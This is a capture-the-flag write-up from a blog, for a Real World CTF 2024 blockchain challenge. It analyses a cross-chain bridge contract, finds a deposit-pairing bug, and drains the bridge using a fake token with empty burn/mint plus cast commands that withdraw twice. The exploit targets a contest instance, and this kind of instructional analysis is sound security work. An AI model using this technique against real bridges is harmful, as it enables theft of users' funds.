+</div><p>We start by examining the <code>finalizeDeposit</code> function in this contract. Essentially, this function is responsible for <code>minting</code> a new <code>_l2Token</code> on the <code>L2</code> chain. In summary, whenever a deposit is made in the <code>L1</code> chain&rsquo;s bridge, an equivalent amount of <code>_l2Token</code> is minted on the <code>L2</code> chain.</p>
+<p>In the <code>L2</code> bridge, there is also a <code>withdraw</code> function, which we can break down into three main steps:</p>
+<ol>
+<li>It burns the specified <code>amount</code> of <code>_l2Token</code>.</li>
+<li>It encodes a message to be sent to the other chain, <code>L1</code> in this case. This message is an encoded version of a call to the <code>finalizeERC20Withdrawal</code> function.</li>
+<li>It sends this encoded message by again triggering the <code>sendCrossDomainMessage</code> function.</li>
+</ol>
+<p>Up to this point, we haven&rsquo;t delved into the <code>finalizeERC20Withdrawal</code> function in the <code>L1</code> bridge code. Here is the function definition:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">finalizeERC20Withdrawal</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span>
+</span></span><span class="line"><span class="cl">        <span class="n">onlyFromCrossDomainAccount</span><span class="p">(</span><span class="n">l2TokenBridge</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">deposits</span><span class="p">[</span><span class="n">_l1Token</span><span class="p">][</span><span class="n">_l2Token</span><span class="p">]</span> <span class="o">=</span> <span class="n">deposits</span><span class="p">[</span><span class="n">_l1Token</span><span class="p">][</span><span class="n">_l2Token</span><span class="p">]</span> <span class="o">-</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">).</span><span class="n">safeTransfer</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">ERC20WithdrawalFinalized</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This function essentially reduces the stored amount from the <code>deposits</code> map and transfers back the <code>_l1Token</code> that was initially deposited.</p>
+<p>To summarize, in the <code>L1</code> Bridge, users can deposit tokens, which triggers the bridge&rsquo;s relayer to relay a message to the <code>L2</code> Bridge, resulting in the minting of new tokens there. Conversely, when withdrawing in the <code>L2</code> Bridge, the bridge&rsquo;s relayer again comes into play, relaying a message back to the <code>L1</code> Bridge, which then facilitates the transfer of the originally deposited tokens back to the user.</p>
+<p>Now that we have a comprehensive understanding of the challenge&rsquo;s general flow, the next step is to identify where the bug might be located.</p>
+<h3 id="finding-the-bug">Finding the Bug</h3>
+<p>We understand that the objective is to drain the bridge, and from the initial setup, we know that the bridge already has <code>2 ETH</code> deposited in it. My approach here was to start by looking for a bug in the most basic aspect, which is how to drain the bridge. Naturally, the first thing that must be triggered is for the bridge to perform an ETH transfer. This can only happen if we initiate a withdrawal from the <code>L2</code> bridge.</p>
+<p>However, it&rsquo;s apparent that for the withdrawal to take place, we must already have a balance in the <code>deposits</code> map. Therefore, it&rsquo;s highly likely that there is a bug in the deposit function of the <code>L1</code> bridge, causing the states of the <code>L1</code> and <code>L2</code> bridges to be unsynchronized.</p>
+<p>Based on this backtracking thought process, we can start searching for the bug by focusing on the deposit function in the <code>L1</code> bridge.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_initiateERC20Deposit</span><span class="p">(</span><span class="kt">address</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">internal</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">).</span><span class="n">safeTransferFrom</span><span class="p">(</span><span class="n">_from</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">message</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_l1Token</span> <span class="o">==</span> <span class="n">weth</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">message</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">IL2ERC20Bridge</span><span class="p">.</span><span class="n">finalizeDeposit</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">Lib_PredeployAddresses</span><span class="p">.</span><span class="n">L2_WETH</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">message</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="n">IL2ERC20Bridge</span><span class="p">.</span><span class="n">finalizeDeposit</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">sendCrossDomainMessage</span><span class="p">(</span><span class="n">l2TokenBridge</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">deposits</span><span class="p">[</span><span class="n">_l1Token</span><span class="p">][</span><span class="n">_l2Token</span><span class="p">]</span> <span class="o">=</span> <span class="n">deposits</span><span class="p">[</span><span class="n">_l1Token</span><span class="p">][</span><span class="n">_l2Token</span><span class="p">]</span> <span class="o">+</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">ERC20DepositInitiated</span><span class="p">(</span><span class="n">_l1Token</span><span class="p">,</span> <span class="n">_l2Token</span><span class="p">,</span> <span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Indeed, upon closer examination, a bug was identified. The flaw lies in the deposit process, specifically when depositing with a pair of <code>(WETH, randomToken)</code>. When such a deposit is made, the <code>L2</code> bridge is instructed to mint <code>WETH</code> on the <code>L2</code> chain instead of the random token, but the balance updated in the <code>L1</code> records the pair as <code>(WETH, randomToken)</code>. This discrepancy leads to a state misalignment between <code>L1</code> and <code>L2</code>. Here&rsquo;s what happens when we execute <code>depositERC20(WETH, randomToken, 2 ETH)</code>:</p>
+<ul>
+<li>On the <code>L1</code> side, the stored state reflects a deposit of <code>2 ETH</code> corresponding to the <code>(WETH, randomToken)</code> pair.</li>
+<li>Contrarily, on the <code>L2</code> side, instead of the <code>randomToken</code>, <code>2</code> of <code>WETH</code> tokens are minted and credited to you. Essentially, this process results in receiving free <code>WETH</code>.</li>
+</ul>
+<p>Due to the aforementioned bug, it becomes possible to withdraw <code>WETH</code> from the <code>L2</code> chain, which then results in receiving it on the <code>L1</code> chain. An important observation here is that the balance of the pair <code>(WETH, randomToken)</code> is not reduced as a result of this deposit. Instead, the balance reduction occurs for the pair <code>(WETH, L2_WETH)</code>. Now, let&rsquo;s consider a scenario where we control the <code>randomToken</code>, have set <code>randomToken.l1Token</code> to <code>WETH</code>, and can control the <code>burn()</code> function to ensure it doesn&rsquo;t revert for any amount we specify.</p>
+<p>In such a situation, executing <code>withdraw(randomToken, 2 ETH)</code> will trigger a message relay to the <code>L1</code> chain, instructing it to transfer additional <code>WETH</code> to us on <code>L1</code>. This withdrawal will be successful because the <code>L1</code> chain still recognizes a balance in the pair <code>(WETH, randomToken)</code>. As a result, we end up receiving an extra amount of <code>ETH</code>.</p>
+<p>Now that the bug has been pinpointed, we can progress to the exploitation phase.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>To start our exploit, we first initiate the challenge to retrieve the necessary information.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─❯ nc 47.251.56.125 1337
+</span></span><span class="line"><span class="cl">team token? &lt;REDACTED&gt;
+</span></span><span class="line"><span class="cl">1 - launch new instance
+</span></span><span class="line"><span class="cl">2 - kill instance
+</span></span><span class="line"><span class="cl">3 - get flag
+</span></span><span class="line"><span class="cl">action? 1
+</span></span><span class="line"><span class="cl">creating private blockchain...
+</span></span><span class="line"><span class="cl">deploying challenge...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">your private blockchain has been set up
+</span></span><span class="line"><span class="cl">it will automatically terminate in 1440 seconds
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">rpc endpoints:
+</span></span><span class="line"><span class="cl">    - http://47.251.56.125:8545/AvvTHxbggxudgUKnrMpQhdRU/l1
+</span></span><span class="line"><span class="cl">    - http://47.251.56.125:8545/AvvTHxbggxudgUKnrMpQhdRU/l2
+</span></span><span class="line"><span class="cl">private key:        0xb308373bfa60a8e22f7e38c2824a3095e3fbc086613a41d4620e80b057ac9e52
+</span></span><span class="line"><span class="cl">challenge contract: 0xbf1da21516b8975941638E0c8CD791713c88B15B
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We aim to get the addresses of <code>L1Bridge</code> and <code>WETH</code> on the <code>L1</code> chain with the help of <code>foundry</code> CLI tools.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast call &lt;CHALLENGE_CONTRACT&gt; &#34;WETH()&#34; --rpc-url &lt;RPC_URL_L1&gt; --private-key &lt;PRIVATE_KEY&gt;
+</span></span><span class="line"><span class="cl">cast call &lt;CHALLENGE_CONTRACT&gt; &#34;BRIDGE()&#34; --rpc-url &lt;RPC_URL_L1&gt; --private-key &lt;PRIVATE_KEY&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>For the <code>L2</code> contracts, their predetermined addresses can be found in <code>Lib_PredeployAddresses.sol</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">library</span> <span class="n">Lib_PredeployAddresses</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">L2_CROSS_DOMAIN_MESSENGER</span> <span class="o">=</span> <span class="mh">0x420000000000000000000000000000000000CAFe</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">L2_ERC20_BRIDGE</span> <span class="o">=</span> <span class="mh">0x420000000000000000000000000000000000baBe</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">L2_WETH</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="mh">0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We also retrieve our address using the given private key.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast wallet address --private-key &lt;PRIVATE_KEY&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We proceed by creating our own token, which we name <code>FakeToken</code>. This token implements the <code>IL2StandardERC20</code> interface defined in the challenge. In the <code>FakeToken</code>, we don&rsquo;t need to fully implement the <code>mint</code> and <code>burn</code> functions; they just need to ensure they don&rsquo;t <code>revert</code>. When deploying <code>FakeToken</code>, it&rsquo;s crucial to set the <code>_l1Token</code> to the <code>WETH</code> address deployed on the <code>L1</code> bridge, so that <code>FakeToken</code> represents a pair of <code>(WETH, FakeToken)</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span> <span class="n">SPDX</span><span class="o">-</span><span class="n">License</span><span class="o">-</span><span class="n">Identifier</span><span class="p">:</span> <span class="n">MIT</span>
+</span></span><span class="line"><span class="cl"><span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="o">.</span><span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">contract</span> <span class="n">FakeToken</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">address</span> <span class="n">public</span> <span class="n">l1Token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">constructor</span><span class="p">(</span><span class="n">address</span> <span class="n">_l1Token</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">l1Token</span> <span class="o">=</span> <span class="n">_l1Token</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">function</span> <span class="n">mint</span><span class="p">(</span><span class="n">address</span> <span class="n">_to</span><span class="p">,</span> <span class="n">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="n">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">function</span> <span class="n">burn</span><span class="p">(</span><span class="n">address</span> <span class="n">_from</span><span class="p">,</span> <span class="n">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="n">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next, we deploy this token on the <code>L2</code> chain. The steps I did are:</p>
+<ul>
+<li>Create a new folder called <code>fake-token</code>.</li>
+<li><code>cd fake-token</code>.</li>
+<li>Call <code>forge init</code>.</li>
+<li>Put the <code>FakeToken.sol</code> inside <code>src</code> folder.</li>
+<li>Call <code>forge create ./src/FakeToken.sol:FakeToken --rpc-url &lt;RPC_URL_L2&gt; --private-key &lt;PRIVATE_KEY&gt; --constructor-args &lt;L1_WETH&gt;</code></li>
+</ul>
+<p>Upon successful deployment, you should receive a confirmation output.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Deployer: 0xfD0D9669CA24Ed6De5B51A3B6bE1dcB33DC8681b
+</span></span><span class="line"><span class="cl">Deployed to: 0xB4d5bcb70Fa5e12387BbD98FC6D43752a8D59a23 &lt;- &lt;FAKE_TOKEN&gt; address
+</span></span><span class="line"><span class="cl">Transaction hash: 0x41fe4d43167d9c77c46beb4521f9c465537ceb45f722a84e1318d92bfcd62299
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The next step is to trigger <code>depositERC20</code> on the <code>L1</code> chain. We start by wrapping our native ether into <code>WETH</code> on <code>L1</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast send &lt;L1_WETH&gt; &#34;deposit()&#34; -r &lt;RPC_URL_L1&gt; --private-key &lt;PRIVATE_KEY&gt; --value 2ether
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then, we allow the <code>L1</code> bridge to use our deposited <code>WETH</code> (2 ETH).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast send &lt;L1_WETH&gt; &#34;approve(address,uint256)&#34; -r &lt;RPC_URL_L1&gt; --private-key &lt;PRIVATE_KEY&gt; -- &lt;L1_BRIDGE&gt; 2000000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, we trigger the <code>depositERC20(WETH, FakeToken, 2 ETH)</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast send &lt;L1_BRIDGE&gt; &#34;depositERC20(address,address,uint256)&#34; -r &lt;RPC_URL_L1&gt; --private-key &lt;PRIVATE_KEY&gt; -- &lt;L1_WETH&gt; &lt;FAKE_TOKEN&gt; 2000000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After making this call, the state of the <code>L1</code> bridge balance will show:</p>
+<ul>
+<li><code>deposits[WETH][L2_WETH] = 2 ETH</code> from the initial challenge deposit.</li>
+<li><code>deposits[WETH][FakeToken] = 2 ETH</code> from our deposit.</li>
+</ul>
+<p>To verify that the deposit worked and triggered the bug, we check the <code>L2</code> chain balance. We should find <code>2 WETH</code> there, confirming the bug&rsquo;s activation.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast call &lt;L2_WETH&gt; &#34;balanceOf(address)&#34; -r &lt;RPC_URL_L2&gt; --private-key &lt;PRIVATE_KEY&gt; -- &lt;PLAYER_ADDRESS&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="https://i.imgur.com/TRSqQN5.png">
+<p>Then, we redeem this free <code>WETH</code> by calling <code>withdraw(L2_WETH, 2 ETH)</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast send &lt;L2_BRIDGE&gt; &#34;withdraw(address,uint256)&#34; -r &lt;RPC_URL_L2&gt; --private-key &lt;PRIVATE_KEY&gt; -- &lt;L2_WETH&gt; 2000000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This action will change the <code>L1</code> bridge state of <code>deposits[WETH][L2_WETH]</code> to 0. However, the <code>deposits[WETH][FakeToken]</code> will still show <code>2 ETH</code>. Next, we make another withdrawal with <code>withdraw(FakeToken, 2 ETH)</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cast send &lt;L2_BRIDGE&gt; &#34;withdraw(address,uint256)&#34; -r &lt;RPC_URL_L2&gt; --private-key &lt;PRIVATE_KEY&gt; -- &lt;FAKE_TOKEN&gt; 2000000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This withdrawal will succeed, despite not having minted any <code>FakeToken</code> on the <code>L2</code> chain (which would generally cause the <code>burn()</code> call to fail). This is because we own this token and our <code>burn()</code> function is essentially an empty function that does nothing. Next, the <code>L2</code> bridge will relay a message to the <code>L1</code>, and the <code>L1Bridge</code> will finalize the withdrawal by reducing the <code>deposits[WETH][FakeToken]</code> to 0 and transferring another <code>2 ETH</code> to us. As a result, the <code>L1</code> bridge is successfully drained due to this bug.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─❯ nc 47.251.56.125 1337
+</span></span><span class="line"><span class="cl">team token? &lt;REDACTED&gt;
+</span></span><span class="line"><span class="cl">1 - launch new instance
+</span></span><span class="line"><span class="cl">2 - kill instance
+</span></span><span class="line"><span class="cl">3 - get flag
+</span></span><span class="line"><span class="cl">action? 3
+</span></span><span class="line"><span class="cl">rwctf{yoU_draINED_BriD6E}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I want to express my sincere thanks for presenting such a realistic bug in this challenge. Kudos to the author, <a href="https://twitter.com/0xiczc" target="_blank" rel="noopener noreffer ">@0xiczc</a>, for crafting an experience that brilliantly mimics real-world scenarios.</p>
+<p><strong>&gt; Flag: rwctf{yoU_draINED_BriD6E}</strong></p>
+<h1 id="social-media">Social Media</h1>
+<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>
+                    
+                </span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/real-world-ctf-2024/" data-title="Real World CTF 2024" data-via="Chovid99" data-hashtags="Writeup,blockchain,EVM,bridge,2024"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/real-world-ctf-2024/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a>,&nbsp;<a href="/tags/evm/">Evm</a>,&nbsp;<a href="/tags/bridge/">Bridge</a>,&nbsp;<a href="/tags/2024/">2024</a></section>
+        <section>
+            
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/asis-ctf-finals-2023/" class="prev" rel="prev" title="ASIS CTF Finals 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>ASIS CTF Finals 2023</a>
+            <a href="/posts/dicectf-2024-quals/" class="next" rel="next" title="DiceCTF 2024 Quals">DiceCTF 2024 Quals<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
